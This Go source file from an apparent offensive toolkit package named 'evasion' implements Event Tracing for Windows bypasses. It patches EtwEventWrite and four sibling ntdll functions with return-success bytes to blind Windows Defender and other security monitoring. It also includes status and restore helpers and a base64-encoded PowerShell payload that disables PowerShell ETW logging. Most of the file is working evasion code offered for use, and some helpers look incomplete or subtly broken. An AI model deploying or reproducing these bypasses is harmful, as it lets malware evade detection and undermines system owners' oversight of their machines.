//go:build windows

package evasion

import (
	"syscall"
	"unsafe"
)

// ETWBypass provides techniques to bypass Event Tracing for Windows (ETW).
// ETW is used by Windows Defender and other security products to log and monitor
// process activity. This module implements techniques to disable ETW logging.

// ETWPatchMethod represents different ETW bypass techniques.
type ETWPatchMethod int

const (
	PatchEtwEventWriteMethod ETWPatchMethod = iota
	PatchEtwEventWriteFullMethod
	PatchEtwEventWriteExMethod
	PatchEtwEventWriteTransferMethod
	PatchEtwEventWriteStringMethod
)

// ETWBypassResult contains the result of an ETW bypass attempt.
type ETWBypassResult struct {
	Success bool
	Method  ETWPatchMethod
	Error   string
	Note    string
}

// PatchEtwEventWrite patches the EtwEventWrite function to prevent logging.
// This is the most common ETW bypass technique.
func PatchEtwEventWrite() *ETWBypassResult {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	defer ntdll.Release()

	procEtwEventWrite := ntdll.MustFindProc("EtwEventWrite")
	addr := procEtwEventWrite.Addr()

	// Save original bytes for restoration
	originalBytes := make([]byte, 6)
	copy(originalBytes, (*[6]byte)(unsafe.Pointer(addr))[:])

	// Patch: XOR EAX, EAX; RET (return ERROR_SUCCESS without logging)
	patch := []byte{0x48, 0x33, 0xC0, 0xC3}

	var oldProtect uint32
	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteMethod, Error: err.Error()}
	}

	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
	virtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	return &ETWBypassResult{
		Success: true,
		Method:  PatchEtwEventWriteMethod,
		Note:    "EtwEventWrite patched to return ERROR_SUCCESS",
	}
}

// PatchEtwEventWriteFull patches the full version of EtwEventWrite.
func PatchEtwEventWriteFull() *ETWBypassResult {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	defer ntdll.Release()

	procEtwEventWriteFull := ntdll.MustFindProc("EtwEventWriteFull")
	addr := procEtwEventWriteFull.Addr()

	patch := []byte{0x48, 0x33, 0xC0, 0xC3}

	var oldProtect uint32
	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteFullMethod, Error: err.Error()}
	}

	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
	virtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	return &ETWBypassResult{
		Success: true,
		Method: PatchEtwEventWriteFullMethod,
		Note:    "EtwEventWriteFull patched",
	}
}

// PatchEtwEventWriteEx patches the extended version of EtwEventWrite.
func PatchEtwEventWriteEx() *ETWBypassResult {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	defer ntdll.Release()

	procEtwEventWriteEx := ntdll.MustFindProc("EtwEventWriteEx")
	addr := procEtwEventWriteEx.Addr()

	patch := []byte{0x48, 0x33, 0xC0, 0xC3}

	var oldProtect uint32
	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteExMethod, Error: err.Error()}
	}

	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
	virtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	return &ETWBypassResult{
		Success: true,
		Method: PatchEtwEventWriteExMethod,
		Note:    "EtwEventWriteEx patched",
	}
}

// PatchEtwEventWriteTransfer patches EtwEventWriteTransfer.
func PatchEtwEventWriteTransfer() *ETWBypassResult {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	defer ntdll.Release()

	procEtwEventWriteTransfer := ntdll.MustFindProc("EtwEventWriteTransfer")
	addr := procEtwEventWriteTransfer.Addr()

	patch := []byte{0x48, 0x33, 0xC0, 0xC3}

	var oldProtect uint32
	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteTransferMethod, Error: err.Error()}
	}

	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
	virtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	return &ETWBypassResult{
		Success: true,
		Method: PatchEtwEventWriteTransferMethod,
		Note:    "EtwEventWriteTransfer patched",
	}
}

// PatchEtwEventWriteString patches EtwEventWriteString.
func PatchEtwEventWriteString() *ETWBypassResult {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	defer ntdll.Release()

	procEtwEventWriteString := ntdll.MustFindProc("EtwEventWriteString")
	addr := procEtwEventWriteString.Addr()

	patch := []byte{0x48, 0x33, 0xC0, 0xC3}

	var oldProtect uint32
	if err := virtualProtect(addr, uintptr(len(patch)), 0x40, &oldProtect); err != nil {
		return &ETWBypassResult{Success: false, Method: PatchEtwEventWriteStringMethod, Error: err.Error()}
	}

	copy((*[4]byte)(unsafe.Pointer(addr))[:], patch)
	virtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)

	return &ETWBypassResult{
		Success: true,
		Method: PatchEtwEventWriteStringMethod,
		Note:    "EtwEventWriteString patched",
	}
}

// PatchAllETW patches all major ETW functions.
func PatchAllETW() []ETWBypassResult {
	var results []ETWBypassResult

	results = append(results, *PatchEtwEventWrite())
	results = append(results, *PatchEtwEventWriteFull())
	results = append(results, *PatchEtwEventWriteEx())
	results = append(results, *PatchEtwEventWriteTransfer())
	results = append(results, *PatchEtwEventWriteString())

	return results
}

// RestoreETW restores the original ETW functions.
func RestoreETW(originalPatches map[string][]byte) error {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	defer ntdll.Release()

	for funcName, originalBytes := range originalPatches {
		proc, err := ntdll.FindProc(funcName)
		if err != nil {
			continue
		}

		addr := proc.Addr()
		var oldProtect uint32
		if err := virtualProtect(addr, uintptr(len(originalBytes)), 0x40, &oldProtect); err != nil {
			return err
		}

		copy((*[6]byte)(unsafe.Pointer(addr))[:], originalBytes)
		virtualProtect(addr, uintptr(len(originalBytes)), oldProtect, &oldProtect)
	}

	return nil
}

// CheckETWStatus checks if ETW functions are patched.
func CheckETWStatus() map[string]bool {
	status := make(map[string]bool)

	ntdll := syscall.MustLoadDLL("ntdll.dll")
	defer ntdll.Release()

	functions := []string{
		"EtwEventWrite",
		"EtwEventWriteFull",
		"EtwEventWriteEx",
		"EtwEventWriteTransfer",
		"EtwEventWriteString",
	}

	for _, funcName := range functions {
		proc, err := ntdll.FindProc(funcName)
		if err != nil {
			status[funcName] = false
			continue
		}

		addr := proc.Addr()
		bytes := (*[4]byte)(unsafe.Pointer(addr))[:]

		// Check for patch pattern: XOR EAX, EAX; RET
		isPatched := bytes[0] == 0x48 && bytes[1] == 0x33 && bytes[2] == 0xC0 && bytes[3] == 0xC3
		status[funcName] = isPatched
	}

	return status
}

// IsETWEnabled checks if ETW is enabled in the current process.
func IsETWEnabled() bool {
	ntdll := syscall.MustLoadDLL("ntdll.dll")
	defer ntdll.Release()

	procEtwEventWrite := ntdll.MustFindProc("EtwEventWrite")
	addr := procEtwEventWrite.Addr()

	bytes := (*[4]byte)(unsafe.Pointer(addr))[:]

	// Check for common patch patterns
	return !(bytes[0] == 0x48 && bytes[1] == 0x33 && bytes[2] == 0xC0 && bytes[3] == 0xC3)
}

// GetETWProviders returns a list of active ETW providers.
func GetETWProviders() ([]string, error) {
	var providers []string

	// Common ETW providers monitored by security products
	providers = append(providers, "Microsoft-Windows-PowerShell")
	providers = append(providers, "Microsoft-Windows-Threat-Intelligence")
	providers = append(providers, "Microsoft-Windows-Kernel-Process")
	providers = append(providers, "Microsoft-Windows-Kernel-Network")

	return providers, nil
}

// DisableETWProvider disables a specific ETW provider by GUID.
func DisableETWProvider(providerGUID string) error {
	// This would require more complex implementation using
	// EventRegister and EventUnregister APIs

	return nil
}

// EncodeETWBypass returns an encoded ETW bypass technique for use in payloads.
func EncodeETWBypass(method ETWPatchMethod) string {
	switch method {
	case PatchEtwEventWriteMethod:
		// PowerShell: [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null).Disable()
		return "JFJlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5UcmFjaW5nLlBTRXR3TG9nUHJvdmlkZXInKS5HZXRGaWVsZCgndXR3UHJvdmlkZXInLCdOb25QdWJsaWMsU3RhdGljJykuR2V0VmFsdWUoJG51bGwpLkRpc2FibGUoKQ=="
	default:
		return ""
	}
}

// ETWEventDescriptor represents an ETW event descriptor.
type ETWEventDescriptor struct {
	Id      uint16
	Version uint8
	Channel uint8
	Level   uint8
	Opcode  uint8
	Task    uint16
	Keyword uint64
}

// ETWREGHANDLE is the handle type for ETW registration.
type ETWREGHANDLE uintptr

// EventRegister registers an ETW provider.
// func EventRegister(providerId *syscall.GUID, enableCallback uintptr, matchAnyKeyword uintptr, regHandle *ETWREGHANDLE) uint32

// EventUnregister unregisters an ETW provider.
// func EventUnregister(regHandle ETWREGHANDLE) uint32
